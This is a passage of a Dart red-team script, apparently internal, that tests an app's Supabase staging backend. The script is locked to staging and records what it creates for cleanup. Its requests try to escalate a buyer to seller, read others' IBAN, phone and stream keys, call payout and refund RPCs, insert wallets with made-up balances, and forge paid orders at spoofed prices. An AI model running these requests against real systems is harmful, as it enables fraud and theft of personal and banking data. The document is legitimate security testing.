// Red Team Cego B — 20260829T1755
// Staging only. service_role = setup/observe/cleanup. Never exploit actor.
// dart run tool/redteam_blind_b_20260829T1755.dart

import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stamp = '20260829T1755';
const stagingRef = 'fxdknzrqjenzqcvnwqqq';
const tag = 'RTB-B-$stamp';

typedef Json = Map<String, dynamic>;

final findings = <Json>[];
final probes = <Json>[];
final mapDump = <String, dynamic>{};
final cleanupIds = <String, List<String>>{
  'products': [],
  'orders': [],
  'lives': [],
  'live_items': [],
  'live_reservation_requests': [],
  'product_offers': [],
  'product_bundles': [],
  'auth_users': [],
};

void note(String id, String title, Json data) {
  probes.add({'id': id, 'title': title, ...data});
}

void finding({
  required String id,
  required String title,
  required String severity,
  required String actor,
  required String preconditions,
  required String request,
  required dynamic before,
  required dynamic result,
  required dynamic after,
  required String impact,
  required String reproduction,
}) {
  findings.add({
    'id': id,
    'title': title,
    'severity': severity,
    'actor': actor,
    'preconditions': preconditions,
    'request': request,
    'before': before,
    'result': result,
    'after': after,
    'impact': impact,
    'reproduction': reproduction,
  });
}

Future<http.Response> rest(
  String url,
  String apikey,
  String bearer, {
  String method = 'GET',
  String path = '',
  Object? body,
  Map<String, String>? extra,
}) {
  final headers = <String, String>{
    'apikey': apikey,
    'Authorization': 'Bearer $bearer',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
    ...?extra,
  };
  final uri = Uri.parse('$url$path');
  switch (method) {
    case 'POST':
      return http.post(uri, headers: headers, body: body == null ? null : jsonEncode(body));
    case 'PATCH':
      return http.patch(uri, headers: headers, body: body == null ? null : jsonEncode(body));
    case 'DELETE':
      return http.delete(uri, headers: headers);
    default:
      return http.get(uri, headers: headers);
  }
}

Json snapRes(http.Response r, {int max = 800}) {
  var body = r.body;
  if (body.length > max) body = '${body.substring(0, max)}…';
  return {'status': r.statusCode, 'body': body};
}

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!url.contains(stagingRef)) {
    throw StateError('Recusa: SUPABASE_URL não é staging $stagingRef');
  }
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final svc = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final client = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: svc,
  );

  stdout.writeln('RTB-B $stamp recon+attack on $stagingRef');

  final buyerJwt = await client.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerJwt = await client.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  final buyerUid = await client.userIdForAccessToken(buyerJwt);
  final sellerUid = await client.userIdForAccessToken(sellerJwt);
  if (buyerUid != buyerId || sellerUid != sellerId) {
    stderr.writeln('WARN jwt uid mismatch buyer=$buyerUid/$buyerId seller=$sellerUid/$sellerId');
  }

  Directory('tool/reports/redteam_blind_b_$stamp').createSync(recursive: true);

  await cycleRecon(client, url, anon, svc, buyerJwt, sellerJwt);
  await cycleIdentity(client, url, anon, buyerJwt, sellerJwt, buyerId, sellerId);
  await cyclePrivacy(url, anon, svc, buyerJwt, sellerJwt, buyerId, sellerId);
  await cycleFinanceRpc(client, url, anon, buyerJwt, sellerJwt, buyerId, sellerId);
  await cycleEdges(client, url, anon, svc, buyerJwt, sellerJwt, buyerId, sellerId);
  await cycleComposition(
    client,
    url,
    anon,
    svc,
    buyerJwt,
    sellerJwt,
    buyerId,
    sellerId,
    env,
  );
  await cycleRace(client, url, anon, buyerJwt, sellerJwt, buyerId, sellerId);
  await cycleCollusion(client, url, anon, svc, buyerJwt, sellerJwt, buyerId, sellerId);

  await cleanup(client);

  final out = {
    'frozen_at': DateTime.now().toUtc().toIso8601String(),
    'stamp': stamp,
    'project': stagingRef,
    'production_touched': false,
    'fase4': false,
    'map': mapDump,
    'probes': probes,
    'findings': findings,
  };
  File('tool/redteam_blind_b_$stamp.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert(out),
  );
  File('tool/reports/redteam_blind_b_$stamp/pass_raw.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert(out),
  );
  stdout.writeln(
    'probes=${probes.length} findings=${findings.length} '
    'P0=${findings.where((f) => f['severity'] == 'P0').length} '
    'P1=${findings.where((f) => f['severity'] == 'P1').length} '
    'P2=${findings.where((f) => f['severity'] == 'P2').length}',
  );
}

Future<void> cycleRecon(
  LiveOpsStagingClient client,
  String url,
  String anon,
  String svc,
  String buyerJwt,
  String sellerJwt,
) async {
  final openapi = await http.get(
    Uri.parse('$url/rest/v1/'),
    headers: {
      'apikey': svc,
      'Authorization': 'Bearer $svc',
      'Accept': 'application/openapi+json',
    },
  );
  final anonOpen = await http.get(
    Uri.parse('$url/rest/v1/'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
      'Accept': 'application/openapi+json',
    },
  );
  mapDump['openapi_svc'] = openapi.statusCode;
  mapDump['openapi_anon'] = anonOpen.statusCode;
  if (openapi.statusCode == 200) {
    final spec = jsonDecode(openapi.body) as Json;
    final paths = (spec['paths'] as Json?) ?? {};
    final tables = <String>[];
    final rpcs = <String>[];
    for (final p in paths.keys) {
      if (p.startsWith('/rpc/')) {
        rpcs.add(p.substring(5));
      } else if (p.startsWith('/') && !p.contains('{')) {
        tables.add(p.substring(1));
      }
    }
    tables.sort();
    rpcs.sort();
    mapDump['tables'] = tables;
    mapDump['rpcs'] = rpcs;
    File('tool/reports/redteam_blind_b_$stamp/openapi_paths.json').writeAsStringSync(
      const JsonEncoder.withIndent('  ').convert({'tables': tables, 'rpcs': rpcs}),
    );
    note('recon.openapi', 'OpenAPI dump', {
      'tables': tables.length,
      'rpcs': rpcs.length,
    });
  } else {
    note('recon.openapi', 'OpenAPI dump failed', snapRes(openapi));
  }

  // Sample orders schema via service (observe)
  try {
    final sample = await client.select('orders', limit: 1);
    mapDump['orders_columns'] =
        sample.isEmpty ? [] : sample.first.keys.toList()..sort();
  } catch (e) {
    mapDump['orders_columns_error'] = e.toString();
  }
}

Future<void> cycleIdentity(
  LiveOpsStagingClient client,
  String url,
  String anon,
  String buyerJwt,
  String sellerJwt,
  String buyerId,
  String sellerId,
) async {
  // Email → UUID as buyer (oracle)
  final sellerEmailFromJwt = envEmail(sellerJwt);
  final emailProbe = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/rpc/batata_find_user_id_by_email',
    body: {'p_email': sellerEmailFromJwt},
  );
  note('id.email_rpc_buyer', 'find_user_id_by_email as buyer', {
    ...snapRes(emailProbe),
    'looked_up': sellerEmailFromJwt.isEmpty ? 'empty' : 'seller_jwt_email',
  });
  if (emailProbe.statusCode == 200 &&
      emailProbe.body.contains(sellerId) &&
      sellerEmailFromJwt.isNotEmpty) {
    finding(
      id: 'RTB-B-1755-P1-EMAIL-ORACLE',
      title: 'Buyer resolve email→UUID de terceiros',
      severity: 'P1',
      actor: 'buyer JWT',
      preconditions: 'email conhecido',
      request: 'rpc batata_find_user_id_by_email(email_seller)',
      before: {},
      result: snapRes(emailProbe),
      after: snapRes(emailProbe),
      impact: 'enumeração de identidade',
      reproduction: 'RPC email como buyer com email alheio',
    );
  }

  final sellerEmailRpc = await rest(
    url,
    anon,
    sellerJwt,
    method: 'POST',
    path: '/rest/v1/rpc/batata_find_user_id_by_email',
    body: {'p_email': 'does-not-exist-$stamp@fleaber.test'},
  );
  note('id.email_rpc_seller_miss', 'email oracle miss as seller', snapRes(sellerEmailRpc));

  // user_type escalation
  final ut = await rest(
    url,
    anon,
    buyerJwt,
    method: 'PATCH',
    path: '/rest/v1/profiles?id=eq.$buyerId',
    body: {'user_type': 'seller'},
  );
  final afterUt = await rest(
    url,
    anon,
    buyerJwt,
    path: '/rest/v1/profiles?id=eq.$buyerId&select=user_type',
  );
  note('id.user_type', 'buyer PATCH user_type=seller', {
    'patch': snapRes(ut),
    'after': snapRes(afterUt),
  });
  if (afterUt.statusCode == 200 && afterUt.body.contains('"seller"')) {
    finding(
      id: 'RTB-B-1755-P1-USERTYPE',
      title: 'Buyer JWT eleva user_type para seller',
      severity: 'P1',
      actor: 'buyer JWT',
      preconditions: 'perfil buyer lab',
      request: 'PATCH /profiles {user_type:seller}',
      before: 'buyer',
      result: snapRes(ut),
      after: snapRes(afterUt),
      impact: 'autoridade de vendedor (Mux/live/helpers) sem onboarding',
      reproduction: 'PATCH profiles.user_type como buyer; reler coluna',
    );
    await rest(
      url,
      anon,
      buyerJwt,
      method: 'PATCH',
      path: '/rest/v1/profiles?id=eq.$buyerId',
      body: {'user_type': 'buyer'},
    );
  }

  // Helper self-insert as victim seller
  final helperIns = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/seller_helpers',
    body: {
      'seller_id': sellerId,
      'helper_user_id': buyerId,
      'invited_by': buyerId,
      'display_name': tag,
      'active': true,
      'invitation_status': 'accepted',
      'permissions': {'can_manage_reservations': true},
    },
  );
  note('id.helper_self', 'buyer INSERT seller_helpers on victim', snapRes(helperIns));
  if (helperIns.statusCode >= 200 && helperIns.statusCode < 300) {
    finding(
      id: 'RTB-B-1755-P1-HELPER',
      title: 'Buyer auto-inscreve-se como staff do seller',
      severity: 'P1',
      actor: 'buyer JWT',
      preconditions: 'seller_helpers insert RLS',
      request: 'POST seller_helpers seller_id=victim permissions.can_manage_reservations',
      before: {},
      result: snapRes(helperIns),
      after: snapRes(helperIns),
      impact: 'confused deputy: aceitar reservas / stock live do vendedor',
      reproduction: 'INSERT seller_helpers como não-owner',
    );
  }

  // Ghost order: seller INSERT buyer=victim without offer
  final ghost = await rest(
    url,
    anon,
    sellerJwt,
    method: 'POST',
    path: '/rest/v1/orders',
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'status': 'reservado',
      'payment_method': 'MB WAY',
      'price_total': 1.0,
      'quantity': 1,
    },
  );
  note('id.ghost_no_offer', 'seller INSERT order for other buyer, no offer', snapRes(ghost));
  if (ghost.statusCode >= 200 && ghost.statusCode < 300) {
    finding(
      id: 'RTB-B-1755-P1-GHOST',
      title: 'Seller fabrica order para buyer alheio sem oferta',
      severity: 'P1',
      actor: 'seller JWT',
      preconditions: 'sem product_offer accepted',
      request: 'POST /orders buyer_id=victim seller_id=self',
      before: {},
      result: snapRes(ghost),
      after: snapRes(ghost),
      impact: 'atribuição / review / stock / banking via order fantasma',
      reproduction: 'INSERT orders como seller com buyer_id alheio',
    );
    final id = extractId(ghost.body);
    if (id != null) cleanupIds['orders']!.add(id);
  }
}

String envEmail(String jwt) {
  try {
    final parts = jwt.split('.');
    if (parts.length < 2) return '';
    var p = parts[1];
    while (p.length % 4 != 0) {
      p += '=';
    }
    final map = jsonDecode(utf8.decode(base64Url.decode(p))) as Json;
    return (map['email'] ?? '').toString();
  } catch (_) {
    return '';
  }
}

String? extractId(String body) {
  try {
    final v = jsonDecode(body);
    if (v is List && v.isNotEmpty) return (v.first as Json)['id']?.toString();
    if (v is Map) return v['id']?.toString();
  } catch (_) {}
  return null;
}

Future<void> cyclePrivacy(
  String url,
  String anon,
  String svc,
  String buyerJwt,
  String sellerJwt,
  String buyerId,
  String sellerId,
) async {
  final tables = <String, String>{
    'profiles': 'id,full_name,phone,iban,mb_way,email,legal_full_name,user_type,stripe_account_id',
    'orders': 'id,buyer_id,seller_id,status,price_total,shipping_address,phone',
    'chat_messages': 'id,chat_id,sender_id,text',
    'chats': 'id,buyer_id,seller_id',
    'lives': 'id,seller_id,mux_stream_key,stream_key,mux_live_id,status',
    'stripe_checkout_events': 'id,session_id,order_id,buyer_id,event,detail',
    'wallets': 'id,user_id,balance,available_balance,pending_balance',
    'wallet_transactions': 'id,wallet_id,amount,type,order_id',
    'order_disputes': 'id,order_id,buyer_id,seller_id,status',
    'live_tips': 'id,buyer_id,seller_id,amount,status',
    'ps_pairing_sessions': 'id,seller_id,code,device_token_plain',
    'seller_device_tokens': 'id,seller_id,token_hash,device_id',
    'reviews': 'id,order_id,author_id,stars,comment',
  };

  for (final e in tables.entries) {
    for (final actor in [
      ['anon', anon],
      ['buyer', buyerJwt],
      ['seller', sellerJwt],
    ]) {
      final r = await rest(
        url,
        anon,
        actor[1],
        path: '/rest/v1/${e.key}?select=${Uri.encodeQueryComponent(e.value)}&limit=5',
      );
      note('priv.${e.key}.${actor[0]}', 'SELECT ${e.key} as ${actor[0]}', snapRes(r));
    }
  }

  // Cross-user order by UUID: pick a seller-side order id via service observe
  final svcOrders = await rest(
    url,
    svc,
    svc,
    path:
        '/rest/v1/orders?select=id,buyer_id,seller_id,status&seller_id=neq.$buyerId&buyer_id=neq.$buyerId&limit=3',
  );
  note('priv.foreign_orders_observe', 'service observe foreign orders', {
    'status': svcOrders.statusCode,
    'n': _len(svcOrders.body),
  });
  final foreign = _ids(svcOrders.body);
  for (final oid in foreign.take(2)) {
    final r = await rest(
      url,
      anon,
      buyerJwt,
      path: '/rest/v1/orders?id=eq.$oid&select=id,buyer_id,seller_id,status,price_total,shipping_address',
    );
    note('priv.order_enum_buyer', 'buyer GET foreign order $oid', snapRes(r));
    if (r.statusCode == 200 && r.body.contains(oid) && r.body.contains('"id"')) {
      finding(
        id: 'RTB-B-1755-P1-ORDER-ENUM',
        title: 'Buyer lê order de terceiros por UUID',
        severity: 'P1',
        actor: 'buyer JWT',
        preconditions: 'UUID de order alheia conhecido',
        request: 'GET /orders?id=eq.{foreign}',
        before: {},
        result: snapRes(r),
        after: snapRes(r),
        impact: 'cross-user dados de encomenda',
        reproduction: 'GET order por UUID sem ser party',
      );
    }
  }

  // Profiles of seller as buyer
  final pSeller = await rest(
    url,
    anon,
    buyerJwt,
    path:
        '/rest/v1/profiles?id=eq.$sellerId&select=id,phone,iban,mb_way,legal_full_name,email,full_name',
  );
  note('priv.profile_seller_as_buyer', 'buyer SELECT seller profile sensitive cols', snapRes(pSeller));
  final leakCols = <String>[];
  for (final col in ['iban', 'mb_way', 'phone', 'legal_full_name', 'email']) {
    if (pSeller.statusCode == 200 &&
        pSeller.body.contains('"$col"') &&
        !pSeller.body.contains('"$col":null') &&
        pSeller.body.contains(sellerId)) {
      leakCols.add(col);
    }
  }
  // Column grant error vs empty row
  if (pSeller.statusCode == 200 && pSeller.body.contains(sellerId)) {
    finding(
      id: 'RTB-B-1755-P1-PROFILE-ROW',
      title: 'Buyer lê row completa do seller em profiles',
      severity: leakCols.isEmpty ? 'P2' : 'P1',
      actor: 'buyer JWT',
      preconditions: 'id de seller conhecido',
      request: 'GET /profiles?id=eq.seller&select=phone,iban,...',
      before: {},
      result: snapRes(pSeller),
      after: {'leaked_non_null': leakCols},
      impact: leakCols.isEmpty
          ? 'row visível; colunas bancárias podem estar a null/revogadas'
          : 'PII/financeiro de terceiros: ${leakCols.join(",")}',
      reproduction: 'GET profiles de outro uid',
    );
  }

  // Mux keys
  final mux = await rest(
    url,
    anon,
    buyerJwt,
    path: '/rest/v1/lives?select=id,mux_stream_key,stream_key,mux_live_id&limit=3',
  );
  note('priv.mux_keys_buyer', 'buyer SELECT lives stream keys', snapRes(mux));
  if (mux.statusCode == 200 &&
      (mux.body.contains('mux_stream_key') || mux.body.contains('stream_key')) &&
      mux.body.contains('"id"')) {
    final hasVal = RegExp(r'(mux_stream_key|stream_key)"\s*:\s*"[^"]+"').hasMatch(mux.body);
    if (hasVal) {
      finding(
        id: 'RTB-B-1755-P1-MUX',
        title: 'Stream key Mux exposta via PostgREST',
        severity: 'P1',
        actor: 'buyer JWT',
        preconditions: 'lives com stream key',
        request: 'GET /lives?select=mux_stream_key,stream_key',
        before: {},
        result: snapRes(mux),
        after: snapRes(mux),
        impact: 'hijack de ingest RTMP',
        reproduction: 'SELECT lives stream key columns',
      );
    }
  }

  // Storage list
  final stor = await http.get(
    Uri.parse('$url/storage/v1/object/list/chat-media'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Content-Type': 'application/json',
    },
  );
  // list is POST
  final storPost = await http.post(
    Uri.parse('$url/storage/v1/object/list/chat-media'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({'prefix': '', 'limit': 20}),
  );
  note('priv.storage_chat', 'storage list chat-media', snapRes(storPost));
  if (storPost.statusCode == 200 && storPost.body.length > 5 && storPost.body != '[]') {
    finding(
      id: 'RTB-B-1755-P2-STORAGE',
      title: 'Listagem storage chat-media visível',
      severity: 'P2',
      actor: 'buyer JWT',
      preconditions: 'bucket chat-media',
      request: 'POST /storage/v1/object/list/chat-media prefix=',
      before: {},
      result: snapRes(storPost, max: 400),
      after: snapRes(storPost, max: 400),
      impact: 'enumeração de objectos de chat',
      reproduction: 'storage list prefix vazio',
    );
  }
  note('priv.storage_get', 'storage GET unused', {'status': stor.statusCode});
}

int _len(String body) {
  try {
    final v = jsonDecode(body);
    if (v is List) return v.length;
  } catch (_) {}
  return -1;
}

List<String> _ids(String body) {
  try {
    final v = jsonDecode(body);
    if (v is List) {
      return v.map((e) => (e as Json)['id']?.toString() ?? '').where((s) => s.isNotEmpty).toList();
    }
  } catch (_) {}
  return [];
}

Future<void> cycleFinanceRpc(
  LiveOpsStagingClient client,
  String url,
  String anon,
  String buyerJwt,
  String sellerJwt,
  String buyerId,
  String sellerId,
) async {
  final rpcs = <String, Json>{
    'batata_wallet_apply_tip_once': {
      'p_wallet_id': sellerId,
      'p_tip_id': '00000000-0000-0000-0000-000000000001',
      'p_amount': 50,
      'p_type': 'gorjeta_recebida',
      'p_description': tag,
    },
    'batata_send_live_tip_from_wallet': {
      'p_live_id': '00000000-0000-0000-0000-000000000001',
      'p_seller_id': sellerId,
      'p_amount': 5,
      'p_message': tag,
    },
    'batata_wallet_payout_debit': {
      'p_user_id': sellerId,
      'p_amount_cents': 1,
      'p_idempotency_key': '$tag-payout',
    },
    'batata_wallet_payout_finish': {
      'p_user_id': sellerId,
      'p_idempotency_key': '$tag-payout',
      'p_stripe_transfer_id': 'tr_fake',
    },
    'batata_ensure_wallet': {'p_user_id': sellerId},
    'batata_release_seller_wallet_for_order': {
      'p_order_id': '00000000-0000-0000-0000-000000000001',
    },
    'batata_refund_buyer_wallet_for_order': {
      'p_order_id': '00000000-0000-0000-0000-000000000001',
    },
    'batata_process_partial_refund_dispute': {
      'p_order_id': '00000000-0000-0000-0000-000000000001',
      'p_amount': 1,
    },
    'batata_seller_direct_payment_details': {'p_seller_id': sellerId},
    'batata_get_my_payout_details': {},
    'batata_settle_live_tip_from_stripe': {
      'p_tip_id': '00000000-0000-0000-0000-000000000001',
      'p_stripe_session_id': 'cs_test_fake',
      'p_paid_amount_cents': 500,
    },
    'staging_nuke_user_data': {'p_user_id': sellerId},
    'staging_restore_stock_before_nuke': {'p_user_id': sellerId},
  };

  for (final e in rpcs.entries) {
    final r = await rest(
      url,
      anon,
      buyerJwt,
      method: 'POST',
      path: '/rest/v1/rpc/${e.key}',
      body: e.value,
    );
    note('fin.rpc.buyer.${e.key}', 'buyer RPC ${e.key}', snapRes(r));
    final ok = r.statusCode >= 200 && r.statusCode < 300;
    final denied = r.statusCode == 401 ||
        r.statusCode == 403 ||
        r.body.contains('42501') ||
        r.body.contains('permission denied') ||
        r.body.contains('Só service_role') ||
        r.body.contains('not_authenticated');
    if (ok &&
        (e.key.contains('payout') ||
            e.key.contains('apply_tip') ||
            e.key.contains('settle_live_tip') ||
            e.key.contains('nuke') ||
            e.key.contains('partial_refund'))) {
      finding(
        id: 'RTB-B-1755-P1-RPC-${e.key}',
        title: 'RPC financeiro executável como buyer: ${e.key}',
        severity: 'P1',
        actor: 'buyer JWT',
        preconditions: 'GRANT execute authenticated',
        request: 'POST /rpc/${e.key} ${jsonEncode(e.value)}',
        before: {},
        result: snapRes(r),
        after: snapRes(r),
        impact: 'confused deputy / mint / payout / nuke',
        reproduction: 'chamar RPC com JWT buyer e IDs alheios',
      );
    }
    if (e.key == 'batata_seller_direct_payment_details' && ok) {
      final leaked = r.body.contains('iban') || r.body.contains('mb_way') || r.body.contains('PT50');
      if (leaked && r.body != '[]' && r.body != 'null') {
        finding(
          id: 'RTB-B-1755-P1-BANK',
          title: 'IBAN/MB WAY revelados sem relação pós-aceitação',
          severity: 'P1',
          actor: 'buyer JWT',
          preconditions: 'sem order reservado off-platform',
          request: 'rpc batata_seller_direct_payment_details(seller)',
          before: {},
          result: snapRes(r),
          after: snapRes(r),
          impact: 'oracle bancário',
          reproduction: 'RPC banking sem order aceite',
        );
      }
    }
    note('fin.rpc.denied_flag.${e.key}', 'denied?', {'denied': denied, 'ok': ok});
  }

  // Wallet INSERT
  final wIns = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/wallets',
    body: {'user_id': buyerId, 'balance': 9999, 'available_balance': 9999},
  );
  note('fin.wallet_insert', 'buyer INSERT wallet balance', snapRes(wIns));
  if (wIns.statusCode >= 200 && wIns.statusCode < 300) {
    finding(
      id: 'RTB-B-1755-P0-WALLET-INS',
      title: 'Buyer INSERT wallet com saldo inventado',
      severity: 'P0',
      actor: 'buyer JWT',
      preconditions: 'wallets insert policy',
      request: 'POST /wallets balance=9999',
      before: {},
      result: snapRes(wIns),
      after: snapRes(wIns),
      impact: 'criação líquida de dinheiro',
      reproduction: 'INSERT wallets como JWT',
    );
  }

  final wtIns = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/wallet_transactions',
    body: {
      'wallet_id': sellerId,
      'amount': 50,
      'type': 'gorjeta_recebida',
      'description': tag,
    },
  );
  note('fin.wt_insert', 'buyer INSERT wallet_transactions credit seller', snapRes(wtIns));
  if (wtIns.statusCode >= 200 && wtIns.statusCode < 300) {
    finding(
      id: 'RTB-B-1755-P0-LEDGER-INS',
      title: 'Buyer INSERT ledger a creditar seller',
      severity: 'P0',
      actor: 'buyer JWT',
      preconditions: 'wallet_transactions insert',
      request: 'POST wallet_transactions type=gorjeta_recebida amount=50',
      before: {},
      result: snapRes(wtIns),
      after: snapRes(wtIns),
      impact: 'mint via ledger',
      reproduction: 'INSERT wallet_transactions JWT',
    );
  }
}

Future<void> cycleEdges(
  LiveOpsStagingClient client,
  String url,
  String anon,
  String svc,
  String buyerJwt,
  String sellerJwt,
  String buyerId,
  String sellerId,
) async {
  final edges = <String, Json>{
    'create-payment-intent': {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'order_id': '00000000-0000-0000-0000-000000000001',
      'amount': 1,
      'shipping_method': 'hand',
    },
    'refund-order': {'order_id': '00000000-0000-0000-0000-000000000001'},
    'create-live-tip-checkout': {
      'seller_id': sellerId,
      'amount_eur': 1,
      'tip_id': '00000000-0000-0000-0000-000000000001',
    },
    'create-connect-account': {'user_id': sellerId, 'amount': 1},
    'create-mux-live': {'title': '$tag mux'},
    'livekit-mux-publish': {
      'step': 'token',
      'live_id': '00000000-0000-0000-0000-000000000001',
    },
    'resolve-mux-playback': {
      'live_id': '00000000-0000-0000-0000-000000000001',
    },
    'delete-test-account': {'confirm': 'APAGAR TUDO'},
    'ingest-ocr-reservation': {
      'live_id': '00000000-0000-0000-0000-000000000001',
      'ocr_line_hash': 'abcdefgh',
      'detected_at': DateTime.now().toUtc().toIso8601String(),
      'ref_number': 1,
    },
    'ps-pairing-claim': {'code': '000000', 'device_id': tag},
    'send-sms-bulkgate': {'phone': '+351900000000', 'text': tag},
    'stripe-webhook': {'type': 'checkout.session.completed'},
  };

  for (final e in edges.entries) {
    final r = await http.post(
      Uri.parse('$url/functions/v1/${e.key}'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $buyerJwt',
        'Content-Type': 'application/json',
      },
      body: jsonEncode(e.value),
    );
    note('edge.buyer.${e.key}', 'buyer Edge ${e.key}', snapRes(r));
  }

  // Tip checkout without tip_id (legitimate create) — should work, not a finding
  final tipOk = await http.post(
    Uri.parse('$url/functions/v1/create-live-tip-checkout'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({'seller_id': sellerId, 'amount_eur': 1}),
  );
  note('edge.tip_create', 'tip checkout 1€', snapRes(tipOk));

  // Mux as buyer
  final muxB = await http.post(
    Uri.parse('$url/functions/v1/create-mux-live'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({'title': '$tag buyer mux hijack'}),
  );
  note('edge.mux_buyer', 'buyer create-mux-live', snapRes(muxB));
  if (muxB.statusCode == 200 && muxB.body.contains('stream')) {
    finding(
      id: 'RTB-B-1755-P1-MUX-CREATE',
      title: 'Buyer cria ingest Mux',
      severity: 'P1',
      actor: 'buyer JWT',
      preconditions: 'user_type buyer',
      request: 'POST create-mux-live',
      before: {},
      result: snapRes(muxB),
      after: snapRes(muxB),
      impact: 'quota/custo Mux + possível broadcast',
      reproduction: 'Edge create-mux-live como buyer',
    );
  }

  // Payout confused deputy
  final pay = await http.post(
    Uri.parse('$url/functions/v1/create-connect-account'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({'user_id': sellerId, 'amount': 1}),
  );
  note('edge.payout_swap', 'buyer payout user_id=seller amount=1', snapRes(pay));

  // GET settle unguessable
  final settle = await http.get(
    Uri.parse(
      '$url/functions/v1/create-payment-intent?checkout_return=success&session_id=cs_test_$stamp',
    ),
    headers: {'apikey': anon, 'Authorization': 'Bearer $anon'},
  );
  note('edge.settle_anon', 'anon GET settle fake session', snapRes(settle));

  // fase2 settle as JWT
  final f2 = await http.post(
    Uri.parse('$url/functions/v1/create-payment-intent?fase2_e2e_settle=1'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({
      'order_id': '00000000-0000-0000-0000-000000000001',
      'payment_intent_id': 'pi_fake',
    }),
  );
  note('edge.fase2_jwt', 'fase2_e2e_settle as buyer JWT', snapRes(f2));
  if (f2.statusCode == 200 && !f2.body.contains('service_role')) {
    finding(
      id: 'RTB-B-1755-P0-FASE2',
      title: 'fase2_e2e_settle aceita JWT buyer',
      severity: 'P0',
      actor: 'buyer JWT',
      preconditions: 'staging e2e settle',
      request: 'POST create-payment-intent?fase2_e2e_settle=1',
      before: {},
      result: snapRes(f2),
      after: snapRes(f2),
      impact: 'settle privilegiado sem service_role',
      reproduction: 'POST fase2_e2e_settle com JWT',
    );
  }
}

Future<void> cycleComposition(
  LiveOpsStagingClient client,
  String url,
  String anon,
  String svc,
  String buyerJwt,
  String sellerJwt,
  String buyerId,
  String sellerId,
  Map<String, String> env,
) async {
  // Create stock=1 product as seller
  final prod = await rest(
    url,
    anon,
    sellerJwt,
    method: 'POST',
    path: '/rest/v1/products',
    body: {
      'seller_id': sellerId,
      'title': '$tag stock1',
      'price': 6.5,
      'quantity': 1,
      'is_sold': false,
      'list_on_marketplace': true,
      'description': tag,
    },
  );
  note('comp.product_create', 'seller INSERT product stock=1', snapRes(prod));
  final productId = extractId(prod.body);
  if (productId == null) {
    note('comp.product_create.fail', 'cannot continue stock chains', snapRes(prod));
    return;
  }
  cleanupIds['products']!.add(productId);

  // Buyer order marketplace
  final ord1 = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/orders',
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': productId,
      'quantity': 1,
      'price_total': 0.01,
      'contract_unit_cents': 1,
      'contract_qty': 99,
      'status': 'pago',
      'payment_method': 'Pagamento na app',
      'shipping_method': 'hand',
    },
  );
  note('comp.order_spoof_insert', 'buyer INSERT pago + spoof contract/price', snapRes(ord1));
  final orderId = extractId(ord1.body);
  if (orderId != null) cleanupIds['orders']!.add(orderId);

  if (orderId != null) {
    final row = await rest(
      url,
      svc,
      svc,
      path:
          '/rest/v1/orders?id=eq.$orderId&select=id,status,price_total,contract_unit_cents,contract_qty,quantity,amount_paid_cents,stock_units_applied,payment_method',
    );
    note('comp.order_after_insert', 'observe sealed order', snapRes(row));
    try {
      final list = jsonDecode(row.body) as List;
      if (list.isNotEmpty) {
        final o = list.first as Json;
        final st = '${o['status']}'.toLowerCase();
        if (st == 'pago') {
          finding(
            id: 'RTB-B-1755-P0-INSERT-PAGO',
            title: 'Buyer INSERT order já pago',
            severity: 'P0',
            actor: 'buyer JWT',
            preconditions: 'product stock=1',
            request: 'POST /orders status=pago',
            before: {'product': productId},
            result: snapRes(ord1),
            after: o,
            impact: 'stock/wallet/reputação sem captura',
            reproduction: 'INSERT orders status=pago',
          );
        }
        if ((o['contract_qty'] == 99) || (o['contract_unit_cents'] == 1)) {
          finding(
            id: 'RTB-B-1755-P1-CONTRACT-SPOOF',
            title: 'JWT impõe contract_qty/unit no INSERT',
            severity: 'P1',
            actor: 'buyer JWT',
            preconditions: 'seal contract trigger',
            request: 'POST /orders contract_qty=99 contract_unit_cents=1',
            before: {},
            result: o,
            after: o,
            impact: 'checkout barato / qty inflada',
            reproduction: 'INSERT com contract_* no payload',
          );
        }
      }
    } catch (_) {}

    // PATCH identity / money / qty
    for (final patch in [
      {'quantity': 9},
      {'price_total': 0.5},
      {'buyer_id': sellerId},
      {'product_id': productId},
